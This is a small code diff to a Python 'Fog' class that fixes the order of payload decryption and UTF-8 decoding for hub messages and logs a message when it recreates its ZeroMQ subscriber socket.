@@ -195,7 +195,7 @@ class Fog:
                 if result:
                     topic = result[0:5].decode("utf-8")
                     if topic == HUB_TOPIC:
-                        self._handle_hub(self._decrypt_payload(result[5:].decode("utf-8")))
+                        self._handle_hub(self._decrypt_payload(result[5:]).decode("utf-8"))
                         print("Result: %s" % result)
                     elif topic == SCREENSHOT_TOPIC:
                         self._handle_screenshot(self._decrypt_payload(result[5:]))
@@ -209,6 +209,7 @@ class Fog:
             except zmq.Again as err:
                 print(err)
             except:
+                print("Reconnecting Sockets")
                 self.sub_socket = self.context.socket(zmq.SUB)
 
                 self.sub_socket.connect("%s:%s" % (self.hub_addr, self.hub_port))
